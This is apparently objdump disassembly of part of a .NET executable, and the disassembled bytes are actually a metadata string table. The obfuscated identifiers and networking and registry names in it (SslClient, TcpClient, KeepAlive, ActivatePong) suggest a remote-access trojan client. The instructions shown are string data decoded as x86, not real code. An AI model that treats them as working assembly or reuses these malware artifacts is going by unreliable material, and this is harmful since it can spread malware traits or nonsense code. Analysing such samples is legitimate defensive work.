  40803d:	4b                   	dec    %ebx
  40803e:	57                   	push   %edi
  40803f:	00 59 66             	add    %bl,0x66(%ecx)
  408042:	75 68                	jne    0x4080ac
  408044:	6b 65 77 4f          	imul   $0x4f,0x77(%ebp),%esp
  408048:	70 68                	jo     0x4080b2
  40804a:	4b                   	dec    %ebx
  40804b:	58                   	pop    %eax
  40804c:	69 79 56 57 00 5a 43 	imul   $0x435a0057,0x56(%ecx),%edi
  408053:	73 72                	jae    0x4080c7
  408055:	78 76                	js     0x4080cd
  408057:	49                   	dec    %ecx
  408058:	5a                   	pop    %edx
  408059:	63 57 00             	arpl   %edx,0x0(%edi)
  40805c:	76 66                	jbe    0x4080c4
  40805e:	56                   	push   %esi
  40805f:	54                   	push   %esp
  408060:	48                   	dec    %eax
  408061:	67 6d                	insl   (%dx),%es:(%di)
  408063:	63 62 4a             	arpl   %esp,0x4a(%edx)
  408066:	79 7a                	jns    0x4080e2
  408068:	57                   	push   %edi
  408069:	00 46 63             	add    %al,0x63(%esi)
  40806c:	78 52                	js     0x4080c0
  40806e:	49                   	dec    %ecx
  40806f:	44                   	inc    %esp
  408070:	54                   	push   %esp
  408071:	49                   	dec    %ecx
  408072:	45                   	inc    %ebp
  408073:	61                   	popa
  408074:	6e                   	outsb  %ds:(%esi),(%dx)
  408075:	51                   	push   %ecx
  408076:	6c                   	insb   (%dx),%es:(%edi)
  408077:	45                   	inc    %ebp
  408078:	58                   	pop    %eax
  408079:	00 6c 7a 65          	add    %ch,0x65(%edx,%edi,2)
  40807d:	61                   	popa
  40807e:	55                   	push   %ebp
  40807f:	44                   	inc    %esp
  408080:	4d                   	dec    %ebp
  408081:	78 48                	js     0x4080cb
  408083:	62 50 4e             	bound  %edx,0x4e(%eax)
  408086:	48                   	dec    %eax
  408087:	58                   	pop    %eax
  408088:	00 77 53             	add    %dh,0x53(%edi)
  40808b:	59                   	pop    %ecx
  40808c:	43                   	inc    %ebx
  40808d:	43                   	inc    %ebx
  40808e:	54                   	push   %esp
  40808f:	6a 59                	push   $0x59
  408091:	63 67 58             	arpl   %esp,0x58(%edi)
  408094:	54                   	push   %esp
  408095:	79 4b                	jns    0x4080e2
  408097:	58                   	pop    %eax
  408098:	00 42 76             	add    %al,0x76(%edx)
  40809b:	50                   	push   %eax
  40809c:	4d                   	dec    %ebp
  40809d:	6f                   	outsl  %ds:(%esi),(%dx)
  40809e:	61                   	popa
  40809f:	50                   	push   %eax
  4080a0:	62 52 51             	bound  %edx,0x51(%edx)
  4080a3:	50                   	push   %eax
  4080a4:	58                   	pop    %eax
  4080a5:	00 74 4f 47          	add    %dh,0x47(%edi,%ecx,2)
  4080a9:	79 71                	jns    0x40811c
  4080ab:	75 61                	jne    0x40810e
  4080ad:	47                   	inc    %edi
  4080ae:	75 67                	jne    0x408117
  4080b0:	56                   	push   %esi
  4080b1:	58                   	pop    %eax
  4080b2:	00 66 46             	add    %ah,0x46(%esi)
  4080b5:	50                   	push   %eax
  4080b6:	53                   	push   %ebx
  4080b7:	6b 6d 74 75          	imul   $0x75,0x74(%ebp),%ebp
  4080bb:	70 61                	jo     0x40811e
  4080bd:	54                   	push   %esp
  4080be:	63 58 00             	arpl   %ebx,0x0(%eax)
  4080c1:	46                   	inc    %esi
  4080c2:	58                   	pop    %eax
  4080c3:	6a 51                	push   $0x51
  4080c5:	68 51 6d 69 59       	push   $0x59696d51
  4080ca:	4a                   	dec    %edx
  4080cb:	71 58                	jno    0x408125
  4080cd:	00 4c 55 72          	add    %cl,0x72(%ebp,%edx,2)
  4080d1:	61                   	popa
  4080d2:	58                   	pop    %eax
  4080d3:	77 71                	ja     0x408146
  4080d5:	65 45                	gs inc %ebp
  4080d7:	68 44 41 59 00       	push   $0x594144
  4080dc:	69 57 51 43 61 69 73 	imul   $0x73696143,0x51(%edi),%edx
  4080e3:	50                   	push   %eax
  4080e4:	6c                   	insb   (%dx),%es:(%edi)
  4080e5:	54                   	push   %esp
  4080e6:	52                   	push   %edx
  4080e7:	47                   	inc    %edi
  4080e8:	59                   	pop    %ecx
  4080e9:	00 52 6f             	add    %dl,0x6f(%edx)
  4080ec:	56                   	push   %esi
  4080ed:	73 74                	jae    0x408163
  4080ef:	55                   	push   %ebp
  4080f0:	72 68                	jb     0x40815a
  4080f2:	48                   	dec    %eax
  4080f3:	59                   	pop    %ecx
  4080f4:	00 4c 52 66          	add    %cl,0x66(%edx,%edx,2)
  4080f8:	42                   	inc    %edx
  4080f9:	4d                   	dec    %ebp
  4080fa:	7a 71                	jp     0x40816d
  4080fc:	43                   	inc    %ebx
  4080fd:	73 4c                	jae    0x40814b
  4080ff:	59                   	pop    %ecx
  408100:	00 76 61             	add    %dh,0x61(%esi)
  408103:	62 48 66             	bound  %ecx,0x66(%eax)
  408106:	74 48                	je     0x408150
  408108:	6f                   	outsl  %ds:(%esi),(%dx)
  408109:	50                   	push   %eax
  40810a:	66 65 75 50          	data16 gs jne 0x40815e
  40810e:	4f                   	dec    %edi
  40810f:	59                   	pop    %ecx
  408110:	00 67 43             	add    %ah,0x43(%edi)
  408113:	6a 6b                	push   $0x6b
  408115:	4e                   	dec    %esi
  408116:	61                   	popa
  408117:	44                   	inc    %esp
  408118:	63 76 51             	arpl   %esi,0x51(%esi)
  40811b:	41                   	inc    %ecx
  40811c:	6f                   	outsl  %ds:(%esi),(%dx)
  40811d:	4c                   	dec    %esp
  40811e:	71 59                	jno    0x408179
  408120:	00 4a 68             	add    %cl,0x68(%edx)
  408123:	79 41                	jns    0x408166
  408125:	63 4d 79             	arpl   %ecx,0x79(%ebp)
  408128:	78 4e                	js     0x408178
  40812a:	73 59                	jae    0x408185
  40812c:	00 41 41             	add    %al,0x41(%ecx)
  40812f:	51                   	push   %ecx
  408130:	55                   	push   %ebp
  408131:	72 46                	jb     0x408179
  408133:	61                   	popa
  408134:	59                   	pop    %ecx
  408135:	5a                   	pop    %edx
  408136:	63 56 4e             	arpl   %edx,0x4e(%esi)
  408139:	42                   	inc    %edx
  40813a:	5a                   	pop    %edx
  40813b:	00 54 76 44          	add    %dl,0x44(%esi,%esi,2)
  40813f:	46                   	inc    %esi
  408140:	6e                   	outsb  %ds:(%esi),(%dx)
  408141:	63 79 4d             	arpl   %edi,0x4d(%ecx)
  408144:	47                   	inc    %edi
  408145:	53                   	push   %ebx
  408146:	75 68                	jne    0x4081b0
  408148:	43                   	inc    %ebx
  408149:	48                   	dec    %eax
  40814a:	5a                   	pop    %edx
  40814b:	00 45 6f             	add    %al,0x6f(%ebp)
  40814e:	59                   	pop    %ecx
  40814f:	42                   	inc    %edx
  408150:	48                   	dec    %eax
  408151:	66 77 71             	data16 ja 0x4081c5
  408154:	50                   	push   %eax
  408155:	79 74                	jns    0x4081cb
  408157:	7a 49                	jp     0x4081a2
  408159:	5a                   	pop    %edx
  40815a:	00 5a 63             	add    %bl,0x63(%edx)
  40815d:	50                   	push   %eax
  40815e:	58                   	pop    %eax
  40815f:	72 6f                	jb     0x4081d0
  408161:	78 47                	js     0x4081aa
  408163:	4c                   	dec    %esp
  408164:	5a                   	pop    %edx
  408165:	00 4f 45             	add    %cl,0x45(%edi)
  408168:	44                   	inc    %esp
  408169:	6b 7a 41 78          	imul   $0x78,0x41(%edx),%edi
  40816d:	79 58                	jns    0x4081c7
  40816f:	4b                   	dec    %ebx
  408170:	71 41                	jno    0x4081b3
  408172:	4e                   	dec    %esi
  408173:	5a                   	pop    %edx
  408174:	00 73 54             	add    %dh,0x54(%ebx)
  408177:	45                   	inc    %ebp
  408178:	68 53 50 47 47       	push   $0x47475053
  40817d:	73 48                	jae    0x4081c7
  40817f:	53                   	push   %ebx
  408180:	6c                   	insb   (%dx),%es:(%edi)
  408181:	79 4f                	jns    0x4081d2
  408183:	5a                   	pop    %edx
  408184:	00 4e 41             	add    %cl,0x41(%esi)
  408187:	76 47                	jbe    0x4081d0
  408189:	41                   	inc    %ecx
  40818a:	6d                   	insl   (%dx),%es:(%edi)
  40818b:	6b 56 4d 54          	imul   $0x54,0x4d(%esi),%edx
  40818f:	5a                   	pop    %edx
  408190:	00 6d 76             	add    %ch,0x76(%ebp)
  408193:	67 68 6e 51 43 64    	addr16 push $0x6443516e
  408199:	6b 76 44 5a          	imul   $0x5a,0x44(%esi),%esi
  40819d:	5a                   	pop    %edx
  40819e:	00 6c 6d 45          	add    %ch,0x45(%ebp,%ebp,2)
  4081a2:	4c                   	dec    %esp
  4081a3:	77 44                	ja     0x4081e9
  4081a5:	6b 6f 59 6f          	imul   $0x6f,0x59(%edi),%ebp
  4081a9:	6d                   	insl   (%dx),%es:(%edi)
  4081aa:	71 61                	jno    0x40820d
  4081ac:	5a                   	pop    %edx
  4081ad:	00 6a 43             	add    %ch,0x43(%edx)
  4081b0:	54                   	push   %esp
  4081b1:	68 75 51 73 57       	push   $0x57735175
  4081b6:	62 5a 00             	bound  %ebx,0x0(%edx)
  4081b9:	65 46                	gs inc %esi
  4081bb:	73 58                	jae    0x408215
  4081bd:	66 52                	push   %dx
  4081bf:	49                   	dec    %ecx
  4081c0:	49                   	dec    %ecx
  4081c1:	5a                   	pop    %edx
  4081c2:	46                   	inc    %esi
  4081c3:	6d                   	insl   (%dx),%es:(%edi)
  4081c4:	6d                   	insl   (%dx),%es:(%edi)
  4081c5:	5a                   	pop    %edx
  4081c6:	00 50 54             	add    %dl,0x54(%eax)
  4081c9:	57                   	push   %edi
  4081ca:	78 64                	js     0x408230
  4081cc:	69 52 70 49 69 6e 5a 	imul   $0x5a6e6949,0x70(%edx),%edx
  4081d3:	00 76 61             	add    %dh,0x61(%esi)
  4081d6:	6c                   	insb   (%dx),%es:(%edi)
  4081d7:	75 65                	jne    0x40823e
  4081d9:	5f                   	pop    %edi
  4081da:	5f                   	pop    %edi
  4081db:	00 59 6a             	add    %bl,0x6a(%ecx)
  4081de:	65 55                	gs push %ebp
  4081e0:	76 4d                	jbe    0x40822f
  4081e2:	52                   	push   %edx
  4081e3:	68 47 61 00 6f       	push   $0x6f006147
  4081e8:	4c                   	dec    %esp
  4081e9:	62 6c 68 4e          	bound  %ebp,0x4e(%eax,%ebp,2)
  4081ed:	78 4a                	js     0x408239
  4081ef:	67 73 4d             	addr16 jae 0x40823f
  4081f2:	49                   	dec    %ecx
  4081f3:	61                   	popa
  4081f4:	00 71 6f             	add    %dh,0x6f(%ecx)
  4081f7:	75 4d                	jne    0x408246
  4081f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4081fa:	51                   	push   %ecx
  4081fb:	51                   	push   %ecx
  4081fc:	68 4b 55 61 00       	push   $0x61554b
  408201:	61                   	popa
  408202:	6a 67                	push   $0x67
  408204:	6d                   	insl   (%dx),%es:(%edi)
  408205:	6b 47 77 6a          	imul   $0x6a,0x77(%edi),%eax
  408209:	78 6f                	js     0x40827a
  40820b:	61                   	popa
  40820c:	00 62 46             	add    %ah,0x46(%edx)
  40820f:	53                   	push   %ebx
  408210:	52                   	push   %edx
  408211:	57                   	push   %edi
  408212:	54                   	push   %esp
  408213:	76 73                	jbe    0x408288
  408215:	71 61                	jno    0x408278
  408217:	00 79 61             	add    %bh,0x61(%ecx)
  40821a:	71 50                	jno    0x40826c
  40821c:	50                   	push   %eax
  40821d:	4f                   	dec    %edi
  40821e:	49                   	dec    %ecx
  40821f:	73 77                	jae    0x408298
  408221:	51                   	push   %ecx
  408222:	54                   	push   %esp
  408223:	5a                   	pop    %edx
  408224:	74 61                	je     0x408287
  408226:	00 47 4a             	add    %al,0x4a(%edi)
  408229:	62 50 62             	bound  %edx,0x62(%eax)
  40822c:	7a 57                	jp     0x408285
  40822e:	6d                   	insl   (%dx),%es:(%edi)
  40822f:	74 75                	je     0x4082a6
  408231:	61                   	popa
  408232:	00 4c 68 77          	add    %cl,0x77(%eax,%ebp,2)
  408236:	52                   	push   %edx
  408237:	6d                   	insl   (%dx),%es:(%edi)
  408238:	58                   	pop    %eax
  408239:	42                   	inc    %edx
  40823a:	72 6d                	jb     0x4082a9
  40823c:	72 78                	jb     0x4082b6
  40823e:	61                   	popa
  40823f:	00 51 5a             	add    %dl,0x5a(%ecx)
  408242:	6a 63                	push   $0x63
  408244:	42                   	inc    %edx
  408245:	63 75 48             	arpl   %esi,0x48(%ebp)
  408248:	48                   	dec    %eax
  408249:	4b                   	dec    %ebx
  40824a:	70 7a                	jo     0x4082c6
  40824c:	61                   	popa
  40824d:	00 55 56             	add    %dl,0x56(%ebp)
  408250:	45                   	inc    %ebp
  408251:	6d                   	insl   (%dx),%es:(%edi)
  408252:	57                   	push   %edi
  408253:	77 71                	ja     0x4082c6
  408255:	49                   	dec    %ecx
  408256:	6d                   	insl   (%dx),%es:(%edi)
  408257:	44                   	inc    %esp
  408258:	62 00                	bound  %eax,(%eax)
  40825a:	78 68                	js     0x4082c4
  40825c:	43                   	inc    %ebx
  40825d:	42                   	inc    %edx
  40825e:	4b                   	dec    %ebx
  40825f:	42                   	inc    %edx
  408260:	52                   	push   %edx
  408261:	56                   	push   %esi
  408262:	6f                   	outsl  %ds:(%esi),(%dx)
  408263:	49                   	dec    %ecx
  408264:	55                   	push   %ebp
  408265:	4e                   	dec    %esi
  408266:	62 00                	bound  %eax,(%eax)
  408268:	4b                   	dec    %ebx
  408269:	4a                   	dec    %edx
  40826a:	4a                   	dec    %edx
  40826b:	79 48                	jns    0x4082b5
  40826d:	55                   	push   %ebp
  40826e:	44                   	inc    %esp
  40826f:	57                   	push   %edi
  408270:	69 5a 69 63 6f 50 62 	imul   $0x62506f63,0x69(%edx),%ebx
  408277:	00 72 51             	add    %dh,0x51(%edx)
  40827a:	7a 52                	jp     0x4082ce
  40827c:	54                   	push   %esp
  40827d:	71 48                	jno    0x4082c7
  40827f:	6e                   	outsb  %ds:(%esi),(%dx)
  408280:	65 6e                	outsb  %gs:(%esi),(%dx)
  408282:	66 62 65 62          	bound  %sp,0x62(%ebp)
  408286:	00 6d 73             	add    %ch,0x73(%ebp)
  408289:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40828c:	6c                   	insb   (%dx),%es:(%edi)
  40828d:	69 62 00 48 72 50 42 	imul   $0x42507248,0x0(%edx),%esp
  408294:	58                   	pop    %eax
  408295:	59                   	pop    %ecx
  408296:	5a                   	pop    %edx
  408297:	73 4f                	jae    0x4082e8
  408299:	70 73                	jo     0x40830e
  40829b:	55                   	push   %ebp
  40829c:	63 00                	arpl   %eax,(%eax)
  40829e:	59                   	pop    %ecx
  40829f:	4f                   	dec    %edi
  4082a0:	48                   	dec    %eax
  4082a1:	65 52                	gs push %edx
  4082a3:	59                   	pop    %ecx
  4082a4:	43                   	inc    %ebx
  4082a5:	77 64                	ja     0x40830b
  4082a7:	63 00                	arpl   %eax,(%eax)
  4082a9:	53                   	push   %ebx
  4082aa:	79 73                	jns    0x40831f
  4082ac:	74 65                	je     0x408313
  4082ae:	6d                   	insl   (%dx),%es:(%edi)
  4082af:	2e 43                	cs inc %ebx
  4082b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4082b2:	6c                   	insb   (%dx),%es:(%edi)
  4082b3:	6c                   	insb   (%dx),%es:(%edi)
  4082b4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4082b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4082ba:	73 2e                	jae    0x4082ea
  4082bc:	47                   	inc    %edi
  4082bd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082bf:	65 72 69             	gs jb  0x40832b
  4082c2:	63 00                	arpl   %eax,(%eax)
  4082c4:	4d                   	dec    %ebp
  4082c5:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4082cc:	74 2e                	je     0x4082fc
  4082ce:	56                   	push   %esi
  4082cf:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4082d6:	73 69                	jae    0x408341
  4082d8:	63 00                	arpl   %eax,(%eax)
  4082da:	67 65 74 5f          	addr16 gs je 0x40833d
  4082de:	53                   	push   %ebx
  4082df:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082e1:	64 53                	fs push %ebx
  4082e3:	79 6e                	jns    0x408353
  4082e5:	63 00                	arpl   %eax,(%eax)
  4082e7:	4b                   	dec    %ebx
  4082e8:	48                   	dec    %eax
  4082e9:	43                   	inc    %ebx
  4082ea:	58                   	pop    %eax
  4082eb:	41                   	inc    %ecx
  4082ec:	71 66                	jno    0x408354
  4082ee:	4a                   	dec    %edx
  4082ef:	76 41                	jbe    0x408332
  4082f1:	73 63                	jae    0x408356
  4082f3:	00 72 63             	add    %dh,0x63(%edx)
  4082f6:	61                   	popa
  4082f7:	4e                   	dec    %esi
  4082f8:	44                   	inc    %esp
  4082f9:	5a                   	pop    %edx
  4082fa:	43                   	inc    %ebx
  4082fb:	4c                   	dec    %esp
  4082fc:	75 42                	jne    0x408340
  4082fe:	4d                   	dec    %ebp
  4082ff:	42                   	inc    %edx
  408300:	73 63                	jae    0x408365
  408302:	00 6f 62             	add    %ch,0x62(%edi)
  408305:	4f                   	dec    %edi
  408306:	53                   	push   %ebx
  408307:	74 4b                	je     0x408354
  408309:	69 79 51 52 46 50 64 	imul   $0x64504652,0x51(%ecx),%edi
  408310:	00 64 5a 55          	add    %ah,0x55(%edx,%ebx,2)
  408314:	4f                   	dec    %edi
  408315:	4c                   	dec    %esp
  408316:	4f                   	dec    %edi
  408317:	49                   	dec    %ecx
  408318:	70 48                	jo     0x408362
  40831a:	75 58                	jne    0x408374
  40831c:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  408320:	64 52                	fs push %edx
  408322:	65 61                	gs popa
  408324:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  408328:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  40832f:	00 
  408330:	54                   	push   %esp
  408331:	68 72 65 61 64       	push   $0x64616572
  408336:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  40833a:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  40833e:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  408342:	41                   	inc    %ecx
  408343:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  408349:	61                   	popa
  40834a:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  408350:	74 5f                	je     0x4083b1
  408352:	43                   	inc    %ebx
  408353:	6f                   	outsl  %ds:(%esi),(%dx)
  408354:	6e                   	outsb  %ds:(%esi),(%dx)
  408355:	6e                   	outsb  %ds:(%esi),(%dx)
  408356:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40835b:	00 67 65             	add    %ah,0x65(%edi)
  40835e:	74 5f                	je     0x4083bf
  408360:	49                   	dec    %ecx
  408361:	73 43                	jae    0x4083a6
  408363:	6f                   	outsl  %ds:(%esi),(%dx)
  408364:	6e                   	outsb  %ds:(%esi),(%dx)
  408365:	6e                   	outsb  %ds:(%esi),(%dx)
  408366:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40836b:	00 73 65             	add    %dh,0x65(%ebx)
  40836e:	74 5f                	je     0x4083cf
  408370:	49                   	dec    %ecx
  408371:	73 43                	jae    0x4083b6
  408373:	6f                   	outsl  %ds:(%esi),(%dx)
  408374:	6e                   	outsb  %ds:(%esi),(%dx)
  408375:	6e                   	outsb  %ds:(%esi),(%dx)
  408376:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40837b:	00 67 65             	add    %ah,0x65(%edi)
  40837e:	74 5f                	je     0x4083df
  408380:	47                   	inc    %edi
  408381:	75 69                	jne    0x4083ec
  408383:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  408387:	65 6e                	outsb  %gs:(%esi),(%dx)
  408389:	64 53                	fs push %ebx
  40838b:	79 6e                	jns    0x4083fb
  40838d:	63 3e                	arpl   %edi,(%esi)
  40838f:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408393:	61                   	popa
  408394:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408397:	6e                   	outsb  %ds:(%esi),(%dx)
  408398:	67 46                	addr16 inc %esi
  40839a:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4083a1:	73 43                	jae    0x4083e6
  4083a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4083ab:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4083b0:	61                   	popa
  4083b1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083b5:	67 46                	addr16 inc %esi
  4083b7:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  4083be:	65 65 70 41          	gs gs jo 0x408403
  4083c2:	6c                   	insb   (%dx),%es:(%edi)
  4083c3:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  4083ca:	42                   	inc    %edx
  4083cb:	61                   	popa
  4083cc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4083d0:	67 46                	addr16 inc %esi
  4083d2:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  4083d9:	65 61                	gs popa
  4083db:	64 65 72 53          	fs gs jb 0x408432
  4083df:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  4083e6:	42                   	inc    %edx
  4083e7:	61                   	popa
  4083e8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ec:	67 46                	addr16 inc %esi
  4083ee:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  4083f5:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  4083fc:	42                   	inc    %edx
  4083fd:	61                   	popa
  4083fe:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408401:	6e                   	outsb  %ds:(%esi),(%dx)
  408402:	67 46                	addr16 inc %esi
  408404:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  40840b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40840f:	61                   	popa
  408410:	74 65                	je     0x408477
  408412:	50                   	push   %eax
  408413:	6f                   	outsl  %ds:(%esi),(%dx)
  408414:	6e                   	outsb  %ds:(%esi),(%dx)
  408415:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  40841b:	61                   	popa
  40841c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40841f:	6e                   	outsb  %ds:(%esi),(%dx)
  408420:	67 46                	addr16 inc %esi
  408422:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  408429:	6e                   	outsb  %ds:(%esi),(%dx)
  40842a:	74 65                	je     0x408491
  40842c:	72 76                	jb     0x4084a4
  40842e:	61                   	popa
  40842f:	6c                   	insb   (%dx),%es:(%edi)
  408430:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408435:	61                   	popa
  408436:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408439:	6e                   	outsb  %ds:(%esi),(%dx)
  40843a:	67 46                	addr16 inc %esi
  40843c:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  408443:	75 66                	jne    0x4084ab
  408445:	66 65 72 3e          	data16 gs jb 0x408487
  408449:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  40844d:	61                   	popa
  40844e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408451:	6e                   	outsb  %ds:(%esi),(%dx)
  408452:	67 46                	addr16 inc %esi
  408454:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  40845b:	66 66 73 65          	data16 data16 jae 0x4084c4
  40845f:	74 3e                	je     0x40849f
  408461:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408465:	61                   	popa
  408466:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408469:	6e                   	outsb  %ds:(%esi),(%dx)
  40846a:	67 46                	addr16 inc %esi
  40846c:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  408473:	73 6c                	jae    0x4084e1
  408475:	43                   	inc    %ebx
  408476:	6c                   	insb   (%dx),%es:(%edi)
  408477:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  40847e:	5f                   	pop    %edi
  40847f:	42                   	inc    %edx
  408480:	61                   	popa
  408481:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408484:	6e                   	outsb  %ds:(%esi),(%dx)
  408485:	67 46                	addr16 inc %esi
  408487:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  40848e:	63 70 43             	arpl   %esi,0x43(%eax)
  408491:	6c                   	insb   (%dx),%es:(%edi)
  408492:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  408499:	5f                   	pop    %edi
  40849a:	42                   	inc    %edx
  40849b:	61                   	popa
  40849c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40849f:	6e                   	outsb  %ds:(%esi),(%dx)
  4084a0:	67 46                	addr16 inc %esi
  4084a2:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  4084a9:	70 65                	jo     0x408510
  4084ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ac:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4084b0:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  4084b7:	61 
  4084b8:	6c                   	insb   (%dx),%es:(%edi)
  4084b9:	75 65                	jne    0x408520
  4084bb:	4b                   	dec    %ebx
  4084bc:	69 6e 64 00 68 4f 57 	imul   $0x574f6800,0x64(%esi),%ebp
  4084c3:	70 44                	jo     0x408509
  4084c5:	75 41                	jne    0x408508
  4084c7:	52                   	push   %edx
  4084c8:	70 70                	jo     0x40853a
  4084ca:	6c                   	insb   (%dx),%es:(%edi)
  4084cb:	59                   	pop    %ecx
  4084cc:	79 70                	jns    0x40853e
  4084ce:	64 00 43 77          	add    %al,%fs:0x77(%ebx)
  4084d2:	5a                   	pop    %edx
  4084d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4084d4:	4a                   	dec    %edx
  4084d5:	62 50 75             	bound  %edx,0x75(%eax)
  4084d8:	4a                   	dec    %edx
  4084d9:	4b                   	dec    %ebx
  4084da:	4e                   	dec    %esi
  4084db:	65 4e                	gs dec %esi
  4084dd:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4084e1:	70 6c                	jo     0x40854f
  4084e3:	61                   	popa
  4084e4:	63 65 00             	arpl   %esp,0x0(%ebp)
  4084e7:	43                   	inc    %ebx
  4084e8:	72 65                	jb     0x40854f
  4084ea:	61                   	popa
  4084eb:	74 65                	je     0x408552
  4084ed:	49                   	dec    %ecx
  4084ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ef:	73 74                	jae    0x408565
  4084f1:	61                   	popa
  4084f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f3:	63 65 00             	arpl   %esp,0x0(%ebp)
  4084f6:	4e                   	dec    %esi
  4084f7:	4e                   	dec    %esi
  4084f8:	4b                   	dec    %ebx
  4084f9:	45                   	inc    %ebp
  4084fa:	5a                   	pop    %edx
  4084fb:	42                   	inc    %edx
  4084fc:	51                   	push   %ecx
  4084fd:	54                   	push   %esp
  4084fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ff:	78 47                	js     0x408548
  408501:	6e                   	outsb  %ds:(%esi),(%dx)
  408502:	65 48                	gs dec %eax
  408504:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  408509:	74 5f                	je     0x40856a
  40850b:	4d                   	dec    %ebp
  40850c:	6f                   	outsl  %ds:(%esi),(%dx)
  40850d:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  408512:	6c                   	insb   (%dx),%es:(%edi)
  408513:	65 4d                	gs dec %ebp
  408515:	6f                   	outsl  %ds:(%esi),(%dx)
  408516:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  40851b:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  408522:	64 65 
  408524:	00 45 6e             	add    %al,0x6e(%ebp)
  408527:	74 65                	je     0x40858e
  408529:	72 44                	jb     0x40856f
  40852b:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40852f:	4d                   	dec    %ebp
  408530:	6f                   	outsl  %ds:(%esi),(%dx)
  408531:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  408536:	79 70                	jns    0x4085a8
  408538:	74 6f                	je     0x4085a9
  40853a:	53                   	push   %ebx
  40853b:	74 72                	je     0x4085af
  40853d:	65 61                	gs popa
  40853f:	6d                   	insl   (%dx),%es:(%edi)
  408540:	4d                   	dec    %ebp
  408541:	6f                   	outsl  %ds:(%esi),(%dx)
  408542:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  408547:	6d                   	insl   (%dx),%es:(%edi)
  408548:	70 72                	jo     0x4085bc
  40854a:	65 73 73             	gs jae 0x4085c0
